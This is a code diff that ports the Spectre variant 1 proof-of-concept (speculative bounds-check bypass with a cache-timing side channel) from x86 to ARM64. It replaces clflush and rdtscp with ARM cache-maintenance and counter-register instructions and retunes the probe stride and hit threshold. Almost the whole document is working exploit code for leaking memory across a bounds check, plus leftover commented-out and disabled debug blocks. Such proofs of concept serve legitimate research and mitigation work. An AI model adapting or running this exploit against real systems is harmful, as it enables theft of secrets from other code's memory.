@@ -1,12 +1,13 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
+#include <time.h>
+#include <unistd.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt", on)
-#else
-#include <x86intrin.h> /* for rdtscp and clflush */
 #endif
+#include <sys/time.h>
 
 /* sscanf_s only works in MSVC. sscanf should work with other compilers*/
 #ifndef _MSC_VER
@@ -20,7 +21,8 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
-uint8_t array2[256 * 512];
+//uint8_t array2[256 * 512];
+uint8_t array2[256 * 1024];
 
 char* secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -30,14 +32,52 @@ void victim_function(size_t x)
 {
 	if (x < array1_size)
 	{
-		temp &= array2[array1[x] * 512];
+		temp &= array2[array1[x] * 1024];
 	}
 }
+
+static inline void dccivac(uint64_t v)
+{                                    
+       __asm__ ("isb");
+       __asm__ ("dsb sy");
+       __asm__ ("dc civac, %0" : : "r" (v));
+       __asm__ ("dsb sy");
+       __asm__ ("isb");
+}                                                                       
+
+static inline uint64_t arch_counter_get_cntvct(void)
+{
+       uint64_t cval;
+
+       __asm__ ("isb");
+       __asm__ ("dsb sy");
+       __asm__ volatile("mrs %0, cntvct_el0" : "=r" (cval));
+       __asm__ ("dsb sy");
+       __asm__ ("isb");
+
+       return cval;
+}
+
+// 50 Mhz timer - 20 ns resolution
+static inline uint64_t arch_counter_get_cntfrq(void)
+{
+       uint64_t cval;
+
+       __asm__ ("isb");
+       __asm__ ("dsb sy");
+       __asm__ volatile("mrs %0, cntfrq_el0" : "=r" (cval));
+       __asm__ ("dsb sy");
+       __asm__ ("isb");
+
+       return cval;
+}
+
 
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+//#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (2) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
@@ -52,40 +92,58 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
 	for (tries = 999; tries > 0; tries--)
+	//for (tries = 2; tries > 0; tries--)
 	{
 		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
-			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+		for (i = 0; i < 256; i++) {
+			//dccivac((uint64_t)&array2[i * 512]);
+			dccivac((uint64_t)&array2[i * 1024]);
+		}
 
 		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
 		training_x = tries % array1_size;
 		for (j = 29; j >= 0; j--)
+		//for (j = 10; j >= 0; j--)
 		{
-			_mm_clflush(&array1_size);
-			for (volatile int z = 0; z < 100; z++)
+			dccivac((uint64_t)&array1_size);
+			for (volatile int z = 0; z < 1000; z++)
 			{
 			} /* Delay (can also mfence) */
 
 			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
 			/* Avoid jumps in case those tip off the branch predictor */
+			//x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
 			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
 			x = training_x ^ (x & (malicious_x ^ training_x));
 
 			/* Call the victim! */
+			//printf("x %llx\n", x);
+			//time1=arch_counter_get_cntvct();
 			victim_function(x);
+			//time2=arch_counter_get_cntvct() - time1;
+			//printf("[%d] time %x\n", j, time2);
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 256; i++)
+		//for (i = 0; i < 10; i++)
 		{
 			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+			//addr = &array2[mix_i * 512];
+			//time1 = __rdtscp(&junk); /* READ TIMER */
+			//dccivac((uint64_t)&array1_size);
+			//dccivac((uint64_t)addr);
+			time1=arch_counter_get_cntvct();
+			//junk = *addr; /* MEMORY ACCESS TO TIME */
+			junk = array2[mix_i * 1024]; /* MEMORY ACCESS TO TIME */
+			//time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			time2=arch_counter_get_cntvct() - time1;
+			//printf("time2 %x\n", time2);
+			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
+				//printf("\t ***** mix_i %d *****\n", mix_i);
+			}
 		}
 
 		/* Locate highest & second-highest results results tallies in j/k */
@@ -118,6 +176,12 @@ int main(int argc, const char* * argv)
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
 	int score[2], len = strlen(secret);
 	uint8_t value[2];
+//
+	register uint64_t time1, time2;
+	int i, mix_i;
+
+	struct timeval start, end;
+
 
 	for (size_t i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
@@ -130,8 +194,11 @@ int main(int argc, const char* * argv)
 	}
 
 	printf("Reading %d bytes:\n", len);
+//
+	//len = 4;
 	while (--len >= 0)
 	{
+#if 1
 		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
 		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
@@ -142,7 +209,54 @@ int main(int argc, const char* * argv)
 				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
 				   score[1]);
 		printf("\n");
+#endif
+#if 0
+		//for (i = 0; i < 256; i++) {
+		//	dccivac((uint64_t)&array2[i * 512]);
+		//}
+		//time1 = arch_counter_get_cntfrq();
+		//printf("[%d] cntfrq %d\n", len, time1);
+		dccivac((uint64_t)&array1_size);
+		time1=arch_counter_get_cntvct();
+		score[0] = array1_size;
+		time2=arch_counter_get_cntvct() - time1;
+		printf("[%d] time %x\n", len, time2);
+			for (volatile int z = 0; z < 1000; z++)
+			{
+			} /* Delay (can also mfence) */
+		time1=arch_counter_get_cntvct();
+		score[0] = array1_size;
+		time2=arch_counter_get_cntvct() - time1;
+		printf("[%d] time %x\n", len, time2);
+
+#endif
+
+#if 0
+		for (i = 0; i < 256; i++) {
+			dccivac((uint64_t)&array2[i * 1024]);
+		}
+		time1=arch_counter_get_cntvct();
+		score[0] = array2[200 * 1024];
+		time2 = arch_counter_get_cntvct() - time1;
+		printf("miss time %d\n", time2);
+		for (i = 0; i < 256; i++)
+		{
+			mix_i = ((i * 167) + 13) & 255;
+			//mix_i = i;
+			//addr = &array2[mix_i * 512];
+			//dccivac((uint64_t)&array1_size);
+			time1=arch_counter_get_cntvct();
+			score[0] = array2[mix_i * 1024]; /* MEMORY ACCESS TO TIME */
+			time2 = arch_counter_get_cntvct() - time1;
+			//printf("[%d]time %d\n", mix_i, time2);
+			if (time2 <= CACHE_HIT_THRESHOLD) {
+				printf("\t ***** mix_i %d *****\n", mix_i);
+			}
+		}
+
+#endif	
 	}
+
 #ifdef _MSC_VER
 	printf("Press ENTER to exit\n");
 	getchar();	/* Pause Windows console */
